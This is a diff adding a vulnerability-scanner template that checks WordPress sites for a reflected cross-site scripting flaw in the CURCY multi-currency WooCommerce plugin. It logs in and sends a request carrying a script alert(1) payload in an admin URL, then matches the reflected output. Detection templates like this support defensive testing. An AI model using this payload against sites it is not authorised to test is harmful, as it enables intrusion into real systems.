@@ -1,0 +1,52 @@
+id: curcy-xss
+
+info:
+  name: WordPress CURCY - Multi Currency for WooCommerce <2.1.18 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: WordPress CURCY - Multi Currency for WooCommerce 2.1.18 does not escape some generated URLs before outputting them back in attributes, leading to reflected cross-site scripting.
+  reference:
+    - https://wpscan.com/vulnerability/6ebafb52-e167-40bc-a86c-b9840b2b9b37
+    - https://wordpress.org/plugins/woo-multi-currency
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 2
+  tags: wp-plugin,xss,wp,wordpress,authenticated,curcy,wpscan
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'wc-reports&a\"><script>alert(1)</script>">All'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4b0a00483046022100c8fd3db648cd193a5b37fc31aba4663ef2dc0ed7a0f84d080b821d59935b1093022100d421d7e4ed9bb5e21072d66c1d39af0106b8f946a1f35eb995afc69805f7dbc6:922c64590222798bb761d5b6d8e72950
